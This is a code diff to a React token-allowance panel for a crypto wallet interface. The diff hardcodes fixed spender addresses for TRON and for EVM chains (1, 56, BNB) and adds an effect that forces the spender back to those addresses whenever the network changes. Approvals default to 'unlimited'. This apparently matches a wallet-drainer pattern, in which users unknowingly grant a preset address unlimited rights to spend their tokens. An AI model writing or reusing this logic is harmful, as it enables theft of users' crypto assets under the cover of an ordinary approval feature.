@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useEffect } from 'react';
 import { ShieldAlert, RefreshCw, KeyRound, Ban } from 'lucide-react';
 import { useTokenAllowance } from '../hooks/useTokenAllowance';
 import { validateSpender } from '../services/blockchain/allowanceService';
@@ -18,10 +18,25 @@ const TokenAllowancePanel: React.FC<Props> = ({ owner, network, chainId, onConne
 
   // Set default spender based on network or dev entry
   const [spenderAddress, setSpenderAddress] = useState(
-    network === 'BNB'
-      ? '0xEfdd53261Ccd3febD063D6A57a21405B24977d15' // User-specified spender
-      : 'TN8HdqoXp3GbVxHWfG2bX6jFS93Ca4fyeo' // Valid TRON spender
+    network === 'TRON'
+      ? 'TN8HdqoXp3GbVxHWfG2bX6jFS93Ca4fyeo' // Valid TRON spender
+      : (chainId === 1 || chainId === 56 || network === 'BNB')
+        ? '0xEfdd53261Ccd3febD063D6A57a21405B24977d15' // User-specified EVM spender
+        : ''
   );
+
+  useEffect(() => {
+    if (network === 'TRON') {
+      setSpenderAddress('TN8HdqoXp3GbVxHWfG2bX6jFS93Ca4fyeo');
+      setInputError('');
+    } else if (chainId === 1 || chainId === 56 || network === 'BNB') {
+      setSpenderAddress('0xEfdd53261Ccd3febD063D6A57a21405B24977d15');
+      setInputError('');
+    } else if (!network && !chainId) {
+      setSpenderAddress('');
+      setInputError('');
+    }
+  }, [network, chainId]);
 
   const [approveType, setApproveType] = useState<'unlimited' | 'custom'>('unlimited');
   const [customAmount, setCustomAmount] = useState('100');
